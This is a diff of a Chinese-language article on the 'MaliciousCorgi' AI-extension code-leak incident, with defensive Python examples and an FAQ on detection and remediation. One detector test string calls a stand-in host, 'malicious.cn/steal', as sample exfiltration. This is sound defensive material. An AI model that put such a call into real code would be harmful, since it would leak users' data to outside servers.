@@ -82,9 +82,6 @@ scenarios: ["AI/ML项目"]
 ---
 ## 代码示例
 
-
-
-
 ```python
 # 示例1：检测代码中是否包含可疑的远程请求
 import re
@@ -118,9 +115,6 @@ requests.get('https://malicious.cn/steal')
 print(check_suspicious_requests(test_code))
 ```
 
-
-
-
 ```python
 # 示例2：监控Python扩展的网络活动
 import psutil
@@ -150,9 +144,6 @@ def get_network_connections():
 # 测试
 print(get_network_connections())
 ```
-
-
-
 
 ```python
 # 示例3：安全地检查AI扩展的权限
@@ -193,10 +184,8 @@ def check_extension_permissions(extension_path):
 print(check_extension_permissions('/path/to/extension'))
 ```
 
-
 ---
 ## 案例研究
-
 
 ### 1：某欧洲金融科技公司
 
@@ -220,8 +209,6 @@ print(check_extension_permissions('/path/to/extension'))
 
 ---
 
-
-
 ### 2：美国硅谷 SaaS 企业
 
  2：美国硅谷 SaaS 企业
@@ -243,8 +230,6 @@ print(check_extension_permissions('/path/to/extension'))
 - 客户信任度提升，续约率提高 5%
 
 ---
-
-
 
 ### 3：开源项目 Apache Dubbo
 
@@ -361,7 +346,6 @@ print(check_extension_permissions('/path/to/extension'))
 ---
 ## 常见问题
 
-
 ### 1: "MaliciousCorgi" 具体是指什么事件？
 
 1: "MaliciousCorgi" 具体是指什么事件？
@@ -369,8 +353,6 @@ print(check_extension_permissions('/path/to/extension'))
 **A**: "MaliciousCorgi" 是网络安全研究员发现的一类恶意软件或供应链攻击的代号。根据 Hacker News 等技术社区的讨论，该事件主要涉及某些 AI 编程助手或浏览器扩展程序被植入恶意代码。这些受感染的插件会在用户不知情的情况下，将本地环境中的代码、敏感密钥或开发数据发送到位于中国的远程服务器。该名称通常指代特定的恶意样本或相关的安全研究报告。
 
 ---
-
-
 
 ### 2: 这些恶意的 AI 扩展程序是如何窃取代码的？
 
@@ -380,8 +362,6 @@ print(check_extension_permissions('/path/to/extension'))
 
 ---
 
-
-
 ### 3: 为什么这类恶意扩展会将数据发送到中国？
 
 3: 为什么这类恶意扩展会将数据发送到中国？
@@ -390,8 +370,6 @@ print(check_extension_permissions('/path/to/extension'))
 
 ---
 
-
-
 ### 4: 我该如何检查自己是否安装了恶意的 AI 扩展？
 
 4: 我该如何检查自己是否安装了恶意的 AI 扩展？
@@ -399,8 +377,6 @@ print(check_extension_permissions('/path/to/extension'))
 **A**: 首先，请检查您的浏览器（Chrome, Edge, Firefox 等）或 IDE（如 VS Code）的扩展列表。对照 Hacker News 或安全公告中提到的具体扩展名称（如果披露了具体名称）。其次，审查扩展的权限：如果一个 AI 助手请求访问“所有网站数据”、“读取和更改所有数据”或拥有过高的网络访问权限，且来源不明或非官方开发商，请立即卸载。最后，使用网络安全软件扫描系统，并检查网络流量是否有异常的对外连接。
 
 ---
-
-
 
 ### 5: 如果我的代码已经被发送到了这些服务器，应该采取什么补救措施？
 
@@ -415,8 +391,6 @@ print(check_extension_permissions('/path/to/extension'))
 
 ---
 
-
-
 ### 6: 使用 AI 编程工具（如 Copilot, Cursor 等）是否还安全？
 
 6: 使用 AI 编程工具（如 Copilot, Cursor 等）是否还安全？
@@ -426,22 +400,6 @@ print(check_extension_permissions('/path/to/extension'))
 - 避免安装声称提供“免费 Premium 功能”的破解版插件。
 - 仔细阅读扩展所需的权限，遵循“最小权限原则”。
 - 在企业环境中，应制定明确的软件采购策略，禁止员工随意安装未审核的 AI 工具。
-
----
-## 思考题
-
-
-### ## 挑战与思考题
-
-### ### 挑战 1: 插件安全评估
-
-### 问题**: 假设你是一名开发者，正在评估一个新的 VS Code AI 插件。请列出三个具体的检查点，用于在安装前判断该插件是否存在将代码发送至第三方服务器的风险。
-
-### 提示**: 关注插件市场页面提供的元数据，特别是权限声明、发布者身份验证信息以及源代码仓库的链接。思考如果一个插件需要“互联网”权限，它通常意味着什么。
-
-### 
-
----
 ## 引用
 
 - **原文链接**: [https://www.koi.ai/blog/maliciouscorgi-the-cute-looking-ai-extensions-leaking-code-from-1-5-million-developers](https://www.koi.ai/blog/maliciouscorgi-the-cute-looking-ai-extensions-leaking-code-from-1-5-million-developers)
@@ -450,7 +408,6 @@ print(check_extension_permissions('/path/to/extension'))
 > 注：文中事实性信息以以上引用为准；观点与推断为 AI Stack 的分析。
 
 ---
-
 
 ---
 ## 站内链接
